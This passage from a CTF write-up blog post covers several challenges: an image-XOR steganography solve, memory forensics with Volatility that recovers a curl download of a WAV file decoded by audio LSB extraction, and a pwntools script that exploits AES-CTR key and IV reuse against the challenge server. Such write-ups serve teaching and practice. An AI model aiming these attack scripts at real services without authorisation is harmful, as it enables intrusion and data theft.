+&amp;LLLaaa@
+]U,qv</code></pre>
+
+<p>Running again <strong>binwalk</strong> on it we will extract 6 images that which make up the flag:</p>
+<img src="/2023/05/28/rocsc-2023/13.58.58.png" class="">
+
+<p>The only problem is that when we try to view the images, they are only gonna get worse and worse as we try to see the next picture.<br>In order to make the pictures look good you need to xor the images between them:</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">xor(image_one, image_two) -&gt; xor_one_two
+xor(xor_one_two, image_three) -&gt; xor_two_three ( this will get us the next visible part of the flag)</code></pre>
+
+<p>So I wrote a python script in order to make things faster:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python3
+from PIL import Image
+from sys import argv
+
+def xor_images(image1, image2, output_path):
+    img1 &#x3D; Image.open(image1)
+    img2 &#x3D; Image.open(image2)
+
+    if img1.size !&#x3D; img2.size:
+        raise ValueError(&quot;Images must have the same dimensions.&quot;)
+
+    img1 &#x3D; img1.convert(&quot;RGB&quot;)
+    img2 &#x3D; img2.convert(&quot;RGB&quot;)
+
+    pixels1 &#x3D; img1.load()
+    pixels2 &#x3D; img2.load()
+
+    result_img &#x3D; Image.new(&quot;RGB&quot;, img1.size)
+    result_pixels &#x3D; result_img.load()
+
+    for x in range(img1.width):
+        for y in range(img1.height):
+            pixel1 &#x3D; pixels1[x, y]
+            pixel2 &#x3D; pixels2[x, y]
+            result_pixel &#x3D; tuple(p1 ^ p2 for p1, p2 in zip(pixel1, pixel2))
+            result_pixels[x, y] &#x3D; result_pixel
+
+    result_img.save(output_path)
+    print(f&quot;XOR image saved to: &#123;output_path&#125;&quot;)
+
+
+image1_path &#x3D; argv[1]
+image2_path &#x3D; argv[2]
+output_path &#x3D; argv[3]
+
+xor_images(image1_path, image2_path, output_path)</code></pre>
+
+<p>Now the only thing that remains to do is to view the xored images and write the flag.<br>You could automate this by using some OCR in order to get the flag faster.</p>
+<h3 id="threat-hunting-threat-hunting"><a href="#threat-hunting-threat-hunting" class="headerlink" title="threat-hunting : threat hunting"></a>threat-hunting : threat hunting</h3><h6 id="Proof-of-Flag-9"><a href="#Proof-of-Flag-9" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h6><p>GahhMyCodeIsSoAnnoying-MyCodeIsSoComplicated-OhManImTryingToEncodeThisString-ItIsSoFrustrating</p>
+<h6 id="Summary-10"><a href="#Summary-10" class="headerlink" title="Summary"></a>Summary</h6><p>We get a encryption file and a <strong>.bin</strong> file.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python3
+
+import os
+import multiprocessing
+import sys
+from scipy.io.wavfile import read
+from scipy.io.wavfile import write
+
+def sb(inpstr, encoding&#x3D;&#39;utf-8&#39;, errors&#x3D;&#39;err&#39;):
+    br &#x3D; bin(int.from_bytes(inpstr.encode(encoding, errors), &#39;big&#39;))[2:]
+    return br.zfill(8 * ((len(br) + 7) &#x2F;&#x2F; 8))
+
+def enc(ib, ar, of, a_d&#x3D;[]):
+    for i in range(0, len(ib) - 1):
+        a_list &#x3D; list(bin(a_d[100 + i, 0]))
+        a_list[-1] &#x3D; ib[i]
+        a_str &#x3D; &quot;&quot;.join(a_list)
+        a_d[100 + i, 0] &#x3D; int(a_str, 2)
+    write(of, ar, a_d)
+
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
+    inpm &#x3D; sys.argv[1]
+    msgg &#x3D; &quot; **##**&quot; + &quot; &quot; + inpm + &quot; &quot; +&quot;##**## &quot;
+    bm &#x3D; sb(msgg)
+    len_bm &#x3D; len(bm)
+    
+    a_inp &#x3D; sys.argv[2]
+    a_out &#x3D; sys.argv[3]
+
+    fc &#x3D; read(a_inp)
+    ar &#x3D; int(fc[0])
+    a_d &#x3D; []
+    a_d &#x3D; fc[1].copy()
+    
+    th &#x3D; multiprocessing.Process(target&#x3D;enc, args&#x3D;(bm, ar, a_out, a_d))
+    th.start()
+    th.join()</code></pre>
+
+<p>The python encryption script was after some time provided. This was a double hint because as you can see in the imports the file we needed to find was a <strong>.wav</strong> file and we also got the encryption function that will help us to decrypt the file.</p>
+<h6 id="Proof-of-Solve-9"><a href="#Proof-of-Solve-9" class="headerlink" title="Proof of Solve"></a>Proof of Solve</h6><p>After a long time using volatility and trying to get some interesting files I used <strong>cmdscan</strong> that searches for processes that might contain command history information:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility -f threat-hunting.bin --profile&#x3D;Win7SP1x64 cmdscan
+Foundation Volatility Framework 2.6 **************************************************
+
+curl https:&#x2F;&#x2F;we.tl&#x2F;t-bChZL6XhkW Cmd</code></pre>
+
+<p>Trying to access the we.tl endpoint we get a <strong>coded_audio.zip</strong> that contains a <strong>coded_audio.wav</strong> file. Now with the previous information we know that we need to decrypt the <strong>coded_audio.wav</strong> and get the hidden message:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">import os
+import multiprocessing
+import sys
+from scipy.io.wavfile import read
+from scipy.io.wavfile import write
+
+def sb(inpstr, encoding&#x3D;&#39;utf-8&#39;, errors&#x3D;&#39;err&#39;):
+    br &#x3D; bin(int.from_bytes(inpstr.encode(encoding, errors), &#39;big&#39;))[2:]
+    return br.zfill(8 * ((len(br) + 7) &#x2F;&#x2F; 8))
+
+def dec(a_d):
+    decrypted_bits &#x3D; &quot;&quot;
+    for i in range(0, a_d.shape[0] - 100):
+        decrypted_bits +&#x3D; bin(a_d[100 + i, 0])[-1]
+    decrypted_str &#x3D; &#39;&#39;.join(chr(int(decrypted_bits[i:i+8], 2)) for i in range(0, len(decrypted_bits), 8))
+    return decrypted_str
+
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
+    a_inp &#x3D; sys.argv[1]
+    
+    fc &#x3D; read(a_inp)
+    a_d &#x3D; fc[1].copy()
+    
+    decrypted_msg &#x3D; dec(a_d)
+    print(&quot;Decrypted message:&quot;, decrypted_msg)</code></pre>
+
+<p>Running the script get us the flag:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">─$ python3 dec.py coded_audio.wav | strings
+Decrypted message:  **##** GahhMyCodeIsSoAnnoying-MyCodeIsSoComplicated-OhManImTryingToEncodeThisString-ItIsSoFrustrating ##**##!s&#x3D;</code></pre>
+
+<h3 id="nopce-cryptography"><a href="#nopce-cryptography" class="headerlink" title="nopce : cryptography"></a>nopce : cryptography</h3><h6 id="Proof-of-Flag-10"><a href="#Proof-of-Flag-10" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h6><p>CTF{369f0e8fe3df1cc5e3f8f6e2d925f3dc1a3eb46e1399765298e061a48bd3af43}</p>
+<h6 id="Summary-11"><a href="#Summary-11" class="headerlink" title="Summary"></a>Summary</h6><p>We get a <strong>AES_CTR</strong> encrypted flag that uses the same key and IV</p>
+<h6 id="Proof-of-Solve-10"><a href="#Proof-of-Solve-10" class="headerlink" title="Proof of Solve"></a>Proof of Solve</h6><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python3
+from pwn import *
+from binascii import hexlify, unhexlify
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.ciphers.modes import CTR
+from Crypto.Random import get_random_bytes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
+
+def blocks(txt):
+	blocks &#x3D; []
+	block_size &#x3D; 4
+	if len(txt) % block_size !&#x3D; 0:
+			txt +&#x3D; b&#39;\0&#39; * (block_size - (len(txt) % block_size))
+	for i in range(0, len(txt), block_size):
+			block &#x3D; txt[i:i+block_size]
+			blocks.append(block)
+	return blocks
+
+def shuffle(ciphertext):
+	blks &#x3D; blocks(ciphertext)
+	for i in range(1,len(blks)):
+			blks[i-1] &#x3D; xor(blks[i-1],blks[i])
+	return b&quot;&quot;.join(blks)
+
+def unshuffle(ciphertext):
+	blks &#x3D; blocks(ciphertext)
+	for i in reversed(range(1, len(blks))):
+			blks[i-1] &#x3D; xor(blks[i-1], blks[i])
+	return b&quot;&quot;.join(blks)
+
+def decrypt(ciphertext):
+	decrypted_text &#x3D; unshuffle(ciphertext)
+
+	decipher &#x3D; Cipher(algorithms.AES(key), mode&#x3D;CTR(iv), backend&#x3D;default_backend())
+	decryptor &#x3D; decipher.decryptor()
+	plaintext &#x3D; decryptor.update(decrypted_text) + decryptor.finalize()
+
+	return plaintext
+
+def main():
+	plaintext &#x3D; cyclic(70)
+
+	p &#x3D; remote(&quot;34.159.31.74&quot;, 31469)
+	p.recvuntil(b&quot;: &quot;, drop&#x3D;True)
+	encrypted_flag &#x3D; unhexlify(p.recvline().strip())
+	print(&quot;Encrypted flag: &quot;, encrypted_flag)
+
+	p.recv()
+	p.sendline(plaintext)
+
+	p.recvuntil(b&quot;: &quot;, drop&#x3D;True)
+	encrypted_text &#x3D; unhexlify(p.recvline().strip())
+	print(&quot;Encrypted text: &quot;, encrypted_text)
+
+	shuffed_plaintext &#x3D; shuffle(plaintext)
+	shuffed_flag &#x3D; xor(shuffed_plaintext, encrypted_text, encrypted_flag)
+
+	print(unshuffle(shuffed_flag))
+
+
+if __name__&#x3D;&#x3D;&quot;__main__&quot;:
+	main()</code></pre></article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2023/05/24/ret2win/" title="ret2win"><span class="has-text-weight-semibold">Next: ret2win</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/IulianSiPunct"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/ischyr"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/iulian-schifirnet-238049201/"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Ischyr</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><div style="margin-top: 2px"></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
